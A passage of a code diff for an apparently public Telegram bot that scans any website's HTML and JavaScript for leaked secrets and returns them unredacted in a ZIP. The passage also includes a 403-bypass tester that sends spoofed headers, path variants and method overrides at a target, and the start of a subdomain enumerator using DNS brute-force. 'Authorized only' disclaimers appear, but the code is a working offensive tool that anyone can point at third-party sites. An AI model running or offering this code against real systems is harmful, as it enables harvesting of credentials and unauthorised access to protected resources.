+    "Stripe Public":     (r'pk_live_[0-9a-zA-Z]{24,}',                     "🟡"),
+    "JWT Token":         (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', "🔴"),
+    "Google API Key":    (r'AIza[0-9A-Za-z_-]{35}',                        "🔴"),
+    "Firebase Config":   (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',       "🔴"),
+    "Private Key Block": (r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',      "🔴"),
+    "GitHub Token":      (r'ghp_[0-9a-zA-Z]{36}',                          "🔴"),
+    "GitLab Token":      (r'glpat-[0-9a-zA-Z_-]{20}',                      "🔴"),
+    "Slack Token":       (r'xox[baprs]-[0-9a-zA-Z\-]+',                    "🔴"),
+    "Bearer Token":      (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',           "🟠"),
+    "Basic Auth Header": (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',"🟠"),
+    "MongoDB URI":       (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',           "🔴"),
+    "MySQL DSN":         (r'mysql://[^\s"\'<>]{10,}',                       "🔴"),
+    "Generic Password":  (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
+    "Telegram Token":    (r'\d{8,10}:AA[0-9a-zA-Z_-]{33}',                 "🔴"),
+    "Sendgrid Key":      (r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',    "🔴"),
+    "Twilio Key":        (r'SK[0-9a-fA-F]{32}',                             "🟠"),
+    "HuggingFace Token": (r'hf_[a-zA-Z]{34}',                              "🟡"),
+    "OpenAI Key":        (r'sk-[a-zA-Z0-9]{48}',                           "🔴"),
+}
+
+async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/extract <url> — Scan HTML + JS for secrets, always exports ZIP with all sources"""
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/extract https://example.com`\n\n"
+            "🔑 Scans HTML source + all external/inline JS files for:\n"
+            "AWS keys, Stripe, JWT, GitHub tokens, Firebase configs,\n"
+            "private keys, MongoDB URIs, passwords & more.\n\n"
+            f"Checks `{len(_SECRET_PATTERNS)}` secret patterns across all JS bundles.\n\n"
+            "📦 *Always exports a ZIP* containing:\n"
+            "  • `index.html` — raw HTML source\n"
+            "  • `js/` folder — all external JS files\n"
+            "  • `inline_scripts/` — all inline `<script>` blocks\n"
+            "  • `report.json` — full findings report\n"
+            "  • `report.txt` — human-readable summary\n\n"
+            "⚠️ _For authorized security research only._",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    domain = urlparse(url).hostname
+
+    msg = await update.effective_message.reply_text(
+        f"🔑 Scanning `{escape_md(domain)}`...\n\n"
+        "⬇️ Phase 1: Fetching HTML source\n"
+        "📦 Phase 2: Downloading JS bundles\n"
+        "🔍 Phase 3: Pattern matching\n"
+        "🗜️ Phase 4: Building ZIP\n\n⏳",
+        parse_mode='Markdown'
+    )
+
+    def _do_extract():
+        session   = requests.Session()
+        session.headers.update(_get_headers())
+
+        resp = session.get(url, timeout=TIMEOUT, verify=False, allow_redirects=True)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+
+        # ── Build source map ──────────────────────────────
+        # sources = { filename_in_zip : content_str }
+        sources        = {}
+        source_origins = {}   # filename → original URL or tag info
+        inline_idx     = 0
+        js_idx         = 0
+
+        # 1. Main HTML
+        sources["index.html"]        = resp.text
+        source_origins["index.html"] = url
+
+        # 2. External JS + inline scripts
+        for script in soup.find_all('script'):
+            src = script.get('src')
+            if src:
+                js_url    = urljoin(url, src) if not src.startswith('http') else src
+                js_safe, _ = is_safe_url(js_url)
+                if not js_safe:
+                    continue
+                try:
+                    jr = session.get(js_url, timeout=12, verify=False)
+                    if jr.status_code == 200 and jr.text.strip():
+                        # Make a safe filename from the URL path
+                        raw_name = src.split('/')[-1].split('?')[0][:60] or f"script_{js_idx}.js"
+                        # Ensure .js extension
+                        if not raw_name.endswith('.js'):
+                            raw_name += '.js'
+                        safe_name = re.sub(r'[^\w\.\-]', '_', raw_name)
+                        fname     = f"js/{js_idx:03d}_{safe_name}"
+                        sources[fname]        = jr.text
+                        source_origins[fname] = js_url
+                        js_idx += 1
+                except Exception:
+                    pass
+            elif script.string and script.string.strip():
+                content_str = script.string.strip()
+                fname       = f"inline_scripts/inline_{inline_idx:03d}.js"
+                sources[fname]        = content_str[:200000]   # cap at 200KB per inline
+                source_origins[fname] = f"<script> tag #{inline_idx} on {url}"
+                inline_idx += 1
+
+        # ── Scan all sources ──────────────────────────────
+        findings  = []
+        seen_keys = set()
+
+        for fname, content in sources.items():
+            file_findings = []
+            for stype, (pattern, risk) in _SECRET_PATTERNS.items():
+                for match in re.finditer(pattern, content):
+                    val = match.group(0)
+                    # ── Phase 1: FP filter ────────────────────────
+                    is_fp, fp_reason = _fp_is_placeholder(val, stype)
+                    if is_fp:
+                        continue
+                    # ─────────────────────────────────────────────
+                    # Store FULL value in findings (goes into ZIP report, not Telegram message)
+                    dedup_key = stype + val[:40]
+                    if dedup_key in seen_keys:
+                        continue
+                    seen_keys.add(dedup_key)
+                    # Redacted copy for Telegram display
+                    if len(val) > 16:
+                        redacted = val[:8] + "…" + val[-4:]
+                    else:
+                        redacted = val[:6] + "…"
+                    file_findings.append({
+                        "type":     stype,
+                        "risk":     risk,
+                        "value_redacted": redacted,
+                        "value_full":     val,       # full value stored in ZIP only
+                        "file":     fname,
+                        "origin":   source_origins.get(fname, ""),
+                        "line":     content[:match.start()].count('\n') + 1,
+                    })
+            findings.extend(file_findings)
+
+        return sources, source_origins, findings
+
+    try:
+        sources, source_origins, findings = await run_scan(uid, _do_extract)
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: `{type(e).__name__}: {str(e)[:80]}`", parse_mode='Markdown')
+        return
+
+    # ── Sort findings by risk ────────────────────────────
+    risk_order = {"🔴": 0, "🟠": 1, "🟡": 2}
+    findings.sort(key=lambda x: risk_order.get(x["risk"], 9))
+
+    critical = sum(1 for f in findings if f["risk"] == "🔴")
+    high     = sum(1 for f in findings if f["risk"] == "🟠")
+    med      = sum(1 for f in findings if f["risk"] == "🟡")
+
+    # ── Build report.txt (human readable, full values) ──
+    txt_lines = [
+        f"=" * 60,
+        f"  EXTRACT REPORT — {domain}",
+        f"  Scanned: {datetime.now().strftime('%Y-%m-%d %H:%M')}",
+        f"  URL: {url}",
+        f"=" * 60,
+        f"",
+        f"SUMMARY",
+        f"-------",
+        f"Sources scanned : {len(sources)} files",
+        f"Patterns checked: {len(_SECRET_PATTERNS)}",
+        f"Findings total  : {len(findings)}",
+        f"  Critical (🔴) : {critical}",
+        f"  High     (🟠) : {high}",
+        f"  Medium   (🟡) : {med}",
+        f"",
+        f"FILES SCANNED",
+        f"-------------",
+    ]
+    for fname, origin in source_origins.items():
+        size_kb = len(sources[fname].encode('utf-8', errors='replace')) / 1024
+        txt_lines.append(f"  [{size_kb:6.1f} KB]  {fname}  ←  {origin[:80]}")
+
+    txt_lines += ["", "FINDINGS", "--------"]
+    if findings:
+        for i, f in enumerate(findings, 1):
+            txt_lines += [
+                f"",
+                f"[{i:03d}] {f['risk']} {f['type']}",
+                f"  File  : {f['file']}",
+                f"  Line  : {f['line']}",
+                f"  Origin: {f['origin'][:80]}",
+                f"  Value : {f['value_full']}",    # ← FULL value in ZIP file
+            ]
+    else:
+        txt_lines.append("  No secrets found.")
+
+    txt_lines += [
+        "",
+        "=" * 60,
+        "  ⚠  This report contains unredacted values.",
+        "  For authorized security research only.",
+        "=" * 60,
+    ]
+    report_txt = "\n".join(txt_lines)
+
+    # ── Build report.json ────────────────────────────────
+    report_json = json.dumps({
+        "domain":          domain,
+        "url":             url,
+        "scanned_at":      datetime.now().isoformat(),
+        "files_scanned":   list(source_origins.values()),
+        "pattern_count":   len(_SECRET_PATTERNS),
+        "findings_count":  len(findings),
+        "summary":         {"critical": critical, "high": high, "medium": med},
+        "findings": [{
+            "type":   f["type"],
+            "risk":   f["risk"],
+            "value":  f["value_full"],
+            "file":   f["file"],
+            "line":   f["line"],
+            "origin": f["origin"],
+        } for f in findings],
+        "files": {fname: source_origins[fname] for fname in sources},
+    }, ensure_ascii=False, indent=2)
+
+    # ── Build ZIP in memory ──────────────────────────────
+    await msg.edit_text(
+        f"🗜️ Building ZIP for `{escape_md(domain)}`...\n"
+        f"📂 `{len(sources)}` source files + reports",
+        parse_mode='Markdown'
+    )
+
+    import io
+    zip_buffer = io.BytesIO()
+    safe_domain = re.sub(r'[^\w\-]', '_', domain)
+    ts          = datetime.now().strftime("%Y%m%d_%H%M%S")
+    zip_name    = f"extract_{safe_domain}_{ts}.zip"
+
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        # Source files
+        for fname, content in sources.items():
+            zf.writestr(f"sources/{fname}", content.encode('utf-8', errors='replace'))
+        # Reports
+        zf.writestr("report.txt",  report_txt.encode('utf-8'))
+        zf.writestr("report.json", report_json.encode('utf-8'))
+        # README
+        _js_count     = sum(1 for f in sources if f.startswith("js/"))
+        _inline_count = sum(1 for f in sources if f.startswith("inline_scripts/"))
+        readme = (
+            f"EXTRACT SCAN — {domain}\n"
+            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}\n\n"
+            f"CONTENTS\n"
+            f"  sources/index.html           — Raw HTML page\n"
+            f"  sources/js/                  — External JS files ({_js_count} files)\n"
+            f"  sources/inline_scripts/      — Inline <script> blocks ({_inline_count} blocks)\n"
+            f"  report.txt                   — Human-readable findings (FULL values)\n"
+            f"  report.json                  — Machine-readable JSON report\n\n"
+            f"FINDINGS: {len(findings)} total  "
+            f"(Critical:{critical} High:{high} Medium:{med})\n"
+        )
+        zf.writestr("README.txt", readme.encode('utf-8'))
+
+    zip_buffer.seek(0)
+    zip_size_mb = zip_buffer.getbuffer().nbytes / 1024 / 1024
+
+    # ── Send Telegram summary (redacted) ────────────────
+    if findings:
+        tg_lines = [
+            f"🚨 *{len(findings)} Secret(s) Found — `{escape_md(domain)}`*",
+            f"🔴 Critical: `{escape_md(critical)}` | 🟠 High: `{escape_md(high)}` | 🟡 Medium: `{escape_md(med)}`",
+            f"📂 Scanned: `{len(sources)}` files\n",
+        ]
+        for f in findings[:15]:
+            tg_lines.append(
+                f"{f['risk']} *{f['type']}*\n"
+                f"   Value: `{f['value_redacted']}`\n"
+                f"   File:  `{f['file']}`  Line `{f['line']}`"
+            )
+        if len(findings) > 15:
+            tg_lines.append(f"\n_…and {len(findings)-15} more — see ZIP report_")
+        tg_lines.append("\n⚠️ _Telegram: values redacted. Full values in ZIP report._")
+    else:
+        tg_lines = [
+            f"✅ *No Secrets Found*",
+            f"🔗 `{escape_md(domain)}`",
+            f"📂 Sources scanned: `{len(sources)}` files",
+            f"🔍 Patterns checked: `{len(_SECRET_PATTERNS)}`",
+            f"\n_ZIP contains all raw source files for manual review._",
+        ]
+
+    tg_text = "\n".join(tg_lines)
+    try:
+        if len(tg_text) > 4000:
+            await msg.edit_text(_truncate_safe_md(tg_text), parse_mode='Markdown')
+        else:
+            await safe_markdown_reply(msg, _truncate_safe_md(tg_text))
+    except Exception:
+        pass
+
+    # ── Send ZIP ─────────────────────────────────────────
+    cap = (
+        f"📦 *Extract ZIP — `{escape_md(domain)}`*\n"
+        f"🔍 `{len(sources)}` source files | `{len(findings)}` findings\n"
+        f"🔴`{escape_md(critical)}` 🟠`{escape_md(high)}` 🟡`{escape_md(med)}` | 💾 `{zip_size_mb:.2f} MB`\n\n"
+        f"📄 `report.txt` — full unredacted values\n"
+        f"📋 `report.json` — machine-readable\n"
+        f"📁 `sources/` — raw HTML + JS files"
+    )
+    try:
+        await context.bot.send_document(
+            chat_id=update.effective_chat.id,
+            document=zip_buffer,
+            filename=zip_name,
+            caption=cap,
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        await update.effective_message.reply_text(
+            f"❌ ZIP send error: `{type(e).__name__}: {str(e)[:60]}`",
+            parse_mode='Markdown'
+        )
+
+
+
+# ══════════════════════════════════════════════════
+# 🔓  /bypass403 — 403 Forbidden Bypass Tester
+# ══════════════════════════════════════════════════
+
+_BYPASS_HEADERS = [
+    {"X-Original-URL":             "{path}"},
+    {"X-Rewrite-URL":              "{path}"},
+    {"X-Custom-IP-Authorization":  "127.0.0.1"},
+    {"X-Forwarded-For":            "127.0.0.1"},
+    {"X-Forwarded-For":            "localhost"},
+    {"X-Remote-IP":                "127.0.0.1"},
+    {"X-Remote-Addr":              "127.0.0.1"},
+    {"X-Host":                     "localhost"},
+    {"X-Real-IP":                  "127.0.0.1"},
+    {"X-ProxyUser-Ip":             "127.0.0.1"},
+    {"Referer":                    "{url}"},
+    {"X-Originating-IP":           "127.0.0.1"},
+    {"True-Client-IP":             "127.0.0.1"},
+    {"Client-IP":                  "127.0.0.1"},
+    {"CF-Connecting-IP":           "127.0.0.1"},
+    {"Forwarded":                  "for=127.0.0.1"},
+    {"X-Frame-Options":            "Allow"},
+    {"X-WAF-Bypass":               "1"},
+    {"X-Bypass":                   "1"},
+    {"Authorization":              "Bearer null"},
+]
+
+_BYPASS_PATH_VARIANTS = [
+    "{path}",
+    "{path}/",
+    "{path}//",
+    "{path}/.",
+    "{path}/..",
+    "/{path_no_slash}%20",
+    "/{path_no_slash}%09",
+    "/{path_no_slash}%00",
+    "/{path_no_slash}..;/",
+    "/{path_no_slash};/",
+    "/{path_no_slash}?",
+    "//{path_no_slash}",
+    "/{path_upper}",
+    "/{path_lower}",
+    "{path_dot_slash}",
+]
+
+_BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
+
+def _bypass_sync(url: str) -> list:
+    """Run all 403 bypass techniques against a URL."""
+    parsed     = urlparse(url)
+    path       = parsed.path or "/"
+    path_clean = path.lstrip("/")
+    base       = f"{parsed.scheme}://{parsed.netloc}"
+    results    = []
+
+
+    def _probe(test_url: str, extra_headers: dict = None, method: str = "GET",
+               label: str = "") -> dict | None:
+        try:
+            h = dict(_get_headers())
+            if extra_headers:
+                # Resolve {path} / {url} placeholders in header values
+                for k, v in extra_headers.items():
+                    v = v.replace("{path}", path).replace("{url}", url)
+                    h[k] = v
+            r = requests.request(
+                method, test_url, headers=h,
+                timeout=8, verify=False,
+                allow_redirects=False,
+                proxies=proxy_manager.get_proxy()
+            )
+            return {
+                "url":    test_url,
+                "method": method,
+                "status": r.status_code,
+                "size":   len(r.content),
+                "label":  label,
+                "headers": dict(r.headers),
+            }
+        except Exception:
+            return None
+
+    # ── Baseline: confirm it's actually 403 ────────
+    baseline = _probe(url, label="baseline")
+    if not baseline:
+        return []
+    results.append({**baseline, "technique": "Baseline"})
+    baseline_status = baseline["status"]
+    baseline_size   = baseline["size"]
+
+    def _is_bypass(r: dict) -> bool:
+        if not r:
+            return False
+        st = r["status"]
+        # Success: 200/201/204/301/302 when baseline was 403/401
+        if baseline_status in (403, 401):
+            if st in (200, 201, 204, 301, 302):
+                return True
+            # Different size even on 403 might indicate WAF bypass
+            if st == baseline_status and abs(r["size"] - baseline_size) > 500:
+                return True
+        return False
+
+    # ── Header manipulation ──────────────────────────
+    for hdr_template in _BYPASS_HEADERS:
+        hdrs = {}
+        for k, v in hdr_template.items():
+            hdrs[k] = v.replace("{path}", path).replace("{url}", url)
+        label = "Header: " + ", ".join(f"{k}: {v}" for k, v in hdr_template.items())
+        r = _probe(url, hdrs, label=label)
+        if r:
+            r["technique"] = "header_manipulation"
+            results.append(r)
+
+    # ── Path variants ────────────────────────────────
+    path_variants = [
+        (f"{base}{path}/",                    "path/"),
+        (f"{base}{path}//",                   "path//"),
+        (f"{base}{path}/.",                   "path/."),
+        (f"{base}/{path_clean}%20",           "url_encode_space"),
+        (f"{base}/{path_clean}%09",           "url_encode_tab"),
+        (f"{base}/{path_clean}%00",           "null_byte"),
+        (f"{base}/{path_clean}..;/",          "path_dotdot"),
+        (f"{base}/{path_clean};/",            "semicolon"),
+        (f"{base}//{path_clean}",             "double_slash"),
+        (f"{base}/{path_clean.upper()}",      "uppercase"),
+        (f"{base}/{path_clean.lower()}",      "lowercase"),
+        (f"{base}/{path_clean}?anything",     "query_append"),
+        (f"{base}/{path_clean}#",             "fragment"),
+        (f"{base}/./{ path_clean}",           "dot_prefix"),
+        (f"{base}/{path_clean}/..",           "dotdot_suffix"),
+    ]
+    for test_url, label in path_variants:
+        safe_ok, _ = is_safe_url(test_url)
+        if not safe_ok:
+            continue
+        r = _probe(test_url, label=label)
+        if r:
+            r["technique"] = "path_variant"
+            results.append(r)
+
+    # ── HTTP method override ─────────────────────────
+    for method in _BYPASS_METHODS:
+        r = _probe(url, method=method, label=f"Method: {method}")
+        if r:
+            r["technique"] = "method_override"
+            results.append(r)
+
+    # ── Method override via header ───────────────────
+    for method in ["GET", "POST", "PUT", "DELETE"]:
+        r = _probe(url,
+                   extra_headers={"X-HTTP-Method-Override": method,
+                                  "X-Method-Override": method},
+                   label=f"X-HTTP-Method-Override: {method}")
+        if r:
+            r["technique"] = "method_override_header"
+            results.append(r)
+
+    # ── Content-Type tricks ──────────────────────────
+    for ct in ["application/json", "text/xml", "application/x-www-form-urlencoded"]:
+        r = _probe(url, extra_headers={"Content-Type": ct, "Content-Length": "0"},
+                   method="POST", label=f"POST Content-Type: {ct}")
+        if r:
+            r["technique"] = "content_type"
+            results.append(r)
+
+    # Tag bypasses
+    for res in results:
+        res["bypassed"] = _is_bypass(res)
+
+    return results
+
+
+async def cmd_bypass403(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/bypass403 <url> — Test 403 Forbidden bypass techniques"""
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/bypass403 https://example.com/admin`\n\n"
+            "🔓 *Tests 50+ bypass techniques:*\n"
+            "  • Header manipulation (X-Original-URL, X-Forwarded-For...)\n"
+            "  • Path normalization variants (/admin/, /ADMIN, /admin/..)\n"
+            "  • HTTP method override (POST, PUT, OPTIONS...)\n"
+            "  • X-HTTP-Method-Override header\n"
+            "  • Content-Type tricks\n"
+            "  • URL encoding bypass (%20, %09, %00)\n\n"
+            "⚠️ _For authorized security testing only._",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{escape_md(reason)}`", parse_mode='Markdown')
+        return
+
+    domain = urlparse(url).hostname
+    path   = urlparse(url).path or "/"
+
+    msg = await update.effective_message.reply_text(
+        f"🔓 *Bypass Testing — `{escape_md(domain)}`*\n"
+        f"Path: `{escape_md(path)}`\n\n"
+        "Running 50+ bypass techniques...\n⏳",
+        parse_mode='Markdown'
+    )
+
+    try:
+        results = await run_scan(uid, _bypass_sync, url)
+    except Exception as e:
+        await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
+        return
+
+    baseline    = next((r for r in results if r.get("technique") == "Baseline"), None)
+    baseline_st = baseline["status"] if baseline else "?"
+    bypasses    = [r for r in results if r.get("bypassed")]
+    tested      = len(results) - 1   # exclude baseline
+
+    lines = [
+        f"🔓 *Bypass Results — `{escape_md(path)}`*",
+        f"🌐 `{escape_md(domain)}` | Baseline: `{escape_md(baseline_st)}`",
+        f"🧪 Tested: `{escape_md(tested)}` techniques | ✅ Bypassed: `{len(bypasses)}`\n",
+    ]
+
+    if not bypasses:
+        lines.append("🔒 No bypasses found — endpoint is well-protected.")
+    else:
+        lines.append(f"*🚨 {len(bypasses)} Bypass(es) Found:*")
+        for b in bypasses[:15]:
+            st_icon = "✅" if b["status"] in (200,201,204) else "↪️"
+            lines.append(
+                f"  {st_icon} `{b['status']}` [{b['method']}] `{b['label'][:55]}`"
+            )
+            if b["status"] in (301, 302):
+                loc = b.get("headers", {}).get("Location", "")
+                if loc:
+                    lines.append(f"      → `{escape_md(loc[:60])}`")
+
+    # ── Summary by technique type ────────────────────
+    tech_counts = {}
+    for b in bypasses:
+        t = b.get("technique", "other")
+        tech_counts[t] = tech_counts.get(t, 0) + 1
+    if tech_counts:
+        lines.append("\n*By technique:*")
+        for t, c in sorted(tech_counts.items(), key=lambda x: -x[1]):
+            lines.append(f"  • `{escape_md(t)}`: {c}")
+
+    lines.append("\n⚠️ _Authorized testing only._")
+
+    # ── Export JSON if bypasses found ────────────────
+    if bypasses:
+        import io
+        report = json.dumps({
+            "url": url, "baseline_status": baseline_st,
+            "tested": tested, "bypasses_found": len(bypasses),
+            "bypass_details": [{
+                "label": b["label"], "method": b["method"],
+                "status": b["status"], "size": b["size"],
+                "technique": b["technique"],
+                "location": b.get("headers",{}).get("Location",""),
+            } for b in bypasses],
+            "all_results": [{
+                "label": r["label"], "method": r["method"],
+                "status": r["status"], "size": r["size"],
+            } for r in results],
+        }, indent=2)
+        buf = io.BytesIO(report.encode())
+        try:
+            await safe_markdown_reply(msg, _truncate_safe_md("\n".join(lines)))
+            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+            await context.bot.send_document(
+                chat_id=update.effective_chat.id,
+                document=buf,
+                filename=f"bypass403_{domain}_{ts}.json",
+                caption=f"🔓 Bypass report — `{escape_md(domain)}` — `{len(bypasses)}` bypasses",
+                parse_mode='Markdown'
+            )
+        except Exception:
+            await safe_markdown_reply(update.effective_message, _truncate_safe_md("\n".join(lines)))
+    else:
+        await safe_markdown_reply(msg, _truncate_safe_md("\n".join(lines)))
+
+
+# ══════════════════════════════════════════════════
+# 📡  /subdomains — Advanced Subdomain Enumerator
+# ══════════════════════════════════════════════════
+
+_SUBDOMAIN_WORDLIST = [
+    "www","mail","smtp","pop","imap","ftp","sftp","ssh","vpn","remote",
+    "api","api2","api3","dev","dev2","staging","stage","beta","alpha","test",
+    "admin","administrator","portal","panel","dashboard","manage","manager",
+    "blog","shop","store","pay","payment","billing","invoice","checkout",
+    "app","apps","mobile","m","wap","static","assets","cdn","media","img",
+    "images","uploads","files","docs","docs2","help","support","kb","wiki",
+    "status","monitor","grafana","prometheus","kibana","elastic","jenkins",
+    "git","gitlab","github","bitbucket","jira","confluence","redmine",
+    "internal","intranet","corp","corporate","private","secure","ssl",
+    "login","auth","sso","oauth","id","identity","account","accounts",
+    "db","database","mysql","postgres","redis","mongo","memcache","cache",
+    "backup","old","legacy","v1","v2","v3","new","next","preview",
+    "sandbox","demo","lab","labs","research","data","analytics","stats",
+    "mx","mx1","mx2","ns","ns1","ns2","ns3","dns","dns1","dns2",
+    "web","web1","web2","web3","server","server1","host","node","node1",
+    "cloud","aws","azure","gcp","heroku","k8s","kubernetes","docker",
+    "ci","cd","build","deploy","ops","devops","infra","infrastructure",
+    "us","eu","asia","uk","au","jp","de","fr","ca","in","br",
+    "prod","production","live","uat","qa","qas","rc","release",
+    "autodiscover","autoconfig","cpanel","whm","plesk","webmail",
+    "forum","forums","community","social","chat","slack","meet",
+    "careers","jobs","press","news","events","about","contact",
+]
+
+def _subdomains_sync(domain: str, progress_q: list) -> dict:
+    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
+    results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
+    found_all    = set()
+
+
+    # ── Source 1: crt.sh (Certificate Transparency) ─
+    progress_q.append("🔍 Querying crt.sh (Certificate Transparency)...")
+    try:
+        r = requests.get(
+            f"https://crt.sh/?q=%.{domain}&output=json",
+            timeout=15, headers={"Accept": "application/json"}
+        )
+        if r.status_code == 200:
+            seen = set()
+            for entry in r.json():
+                names = entry.get("name_value", "").split("\n")
+                for name in names:
+                    name = name.strip().lower().lstrip("*.")
+                    if name.endswith(f".{domain}") or name == domain:
+                        sub = name.replace(f".{domain}", "").replace(domain, "")
+                        if sub and sub not in seen and len(sub) < 60:
+                            seen.add(sub)
+                            results["crtsh"].append(name)
+                            found_all.add(name)
+            progress_q.append(f"✅ crt.sh: `{len(results['crtsh'])}` subdomains found")
+    except Exception as e:
+        results["errors"].append(f"crt.sh: {e}")
+
+    # ── Source 2: HackerTarget API (free) ────────────
+    progress_q.append("🔍 Querying HackerTarget API...")
+    try:
+        r = requests.get(
+            f"https://api.hackertarget.com/hostsearch/?q={domain}",
+            timeout=12
+        )
+        if r.status_code == 200 and "error" not in r.text.lower()[:30]:
+            for line in r.text.strip().split("\n"):
+                if "," in line:
+                    hostname = line.split(",")[0].strip().lower()
+                    if hostname.endswith(f".{domain}"):
+                        found_all.add(hostname)
+                        results["hackertarget"].append(hostname)
+            progress_q.append(f"✅ HackerTarget: `{len(results['hackertarget'])}` found")
+    except Exception as e:
+        results["errors"].append(f"HackerTarget: {e}")
+
+    # ── Source 3: DNS Brute-force ────────────────────
+    progress_q.append(f"🔍 DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)...")
+    live_subs  = []
+    wildcard_ip = None
+
+    # Wildcard detection
+    try:
+        wc_ip = socket.gethostbyname(f"thissubdomaindoesnotexist99.{domain}")
+        wildcard_ip = wc_ip
+        progress_q.append(f"⚠️ Wildcard DNS detected (`{escape_md(wc_ip)}`) — filtering...")
+    except socket.gaierror:
+        pass
+
+    def _check_sub(word):
+        hostname = f"{word}.{domain}"
+        try:
+            ip = socket.gethostbyname(hostname)
+            # Filter wildcard
+            if wildcard_ip and ip == wildcard_ip:
+                return None
+            return (hostname, ip)
+        except socket.gaierror:
+            return None
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
+        futs = {ex.submit(_check_sub, w): w for w in _SUBDOMAIN_WORDLIST}
+        done = 0
+        for fut in concurrent.futures.as_completed(futs, timeout=45):
+            done += 1
+            if done % 50 == 0:
+                progress_q.append(f"🔍 Brute-force: `{done}/{len(_SUBDOMAIN_WORDLIST)}` tested | `{len(live_subs)}` live")
+            try:
+                res = fut.result(timeout=4)
+                if res:
+                    hostname, ip = res
+                    live_subs.append({"hostname": hostname, "ip": ip})
+                    found_all.add(hostname)
+            except Exception:
+                pass
+
+    results["bruteforce"] = live_subs
+    progress_q.append(f"✅ Brute-force: `{len(live_subs)}` live subdomains")
+
+    # ── Deduplicate and resolve all found ────────────
+    all_unique = sorted(found_all)
+    resolved   = {}
+    for h in all_unique[:100]:
+        try:
+            resolved[h] = socket.gethostbyname(h)
+        except Exception:
+            resolved[h] = "unresolved"
+
+    results["all_unique"]    = all_unique
+    results["resolved"]      = resolved
+    results["total_unique"]  = len(all_unique)
+    results["wildcard_detected"] = wildcard_ip is not None
+
+    return results
+
+
+async def cmd_subdomains(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/subdomains <domain> — Advanced subdomain enumeration"""
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📌 *Usage:* `/subdomains example.com`\n\n"
+            "📡 *3 sources combined:*\n"
+            "  ① crt.sh — Certificate Transparency logs (passive)\n"
+            "  ② HackerTarget API — public dataset\n"
+            f"  ③ DNS brute-force — {len(_SUBDOMAIN_WORDLIST)} wordlist\n\n"
+            "🛡 Wildcard DNS auto-detection & filtering\n"
+            "📦 Exports full list as `.txt` + `.json` files",
+            parse_mode='Markdown'
+        )
+        return
+
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    raw = context.args[0].strip().replace("https://","").replace("http://","").split("/")[0].lower()
+
+    # Basic domain validation
+    if not re.match(r'^[a-z0-9][a-z0-9\-.]+\.[a-z]{2,}$', raw):
+        await update.effective_message.reply_text("❌ Invalid domain format. Example: `example.com`", parse_mode='Markdown')
+        return
+
+    # SSRF: block private IPs for the apex domain
+    try:
+        apex_ip = socket.gethostbyname(raw)
+        if not _is_safe_ip(apex_ip):
+            await update.effective_message.reply_text(f"🚫 Private IP blocked: `{escape_md(apex_ip)}`", parse_mode='Markdown')
+            return
+    except socket.gaierror:
+        pass  # domain may not have A record — still continue
+
+    msg = await update.effective_message.reply_text(
+        f"📡 *Subdomain Enumeration — `{escape_md(raw)}`*\n\n"
+        f"① crt.sh (CT logs)\n② HackerTarget API\n"
+        f"③ DNS brute-force ({len(_SUBDOMAIN_WORDLIST)} words)\n\n⏳",
+        parse_mode='Markdown'
+    )
+
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(4)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try:
+                    await msg.edit_text(
+                        f"📡 *Enumerating `{escape_md(raw)}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception:
+                    pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await run_scan(uid, _subdomains_sync, raw, progress_q)
+    except asyncio.CancelledError:
+        prog.cancel()
+        await msg.edit_text("🛑 Operation stopped\n`/stop` ဖြင့် ရပ်လိုက်သည်", parse_mode='Markdown')
+        return
+    except Exception as e:
+        prog.cancel()
+        await msg.edit_text(f"❌ Error: `{escape_md(e)}`", parse_mode='Markdown')
+        return
